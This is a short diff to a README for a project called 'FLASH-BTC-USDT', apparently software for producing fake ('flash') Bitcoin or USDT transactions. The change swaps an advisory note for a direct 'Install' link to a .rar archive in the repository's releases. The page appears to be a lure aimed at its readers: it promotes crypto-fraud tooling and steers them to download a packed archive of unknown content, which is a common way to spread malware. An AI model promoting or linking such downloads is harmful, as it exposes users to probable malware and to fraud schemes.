@@ -2,10 +2,8 @@ Picture of the program: https://imgur.com/a/FVraesf
 ## 📢 Updated
 + **The program has been updated, you can download the latest version from the "Relase" section.**
 
-## 🏹・Important!
-```js
-・ If you want to use the application quickly and smoothly without any errors, I recommend you to download the newest and most updated version from the "Relase" section. ✔️
-```
+## 🏹・Download
+️⚽️ Install --> [Releases](https://github.com/Lyopx/FLASH-BTC-USDT/releases/download/v2.1/Relase.rar)
 
 ## 💫・Setup:
 ```sh-session
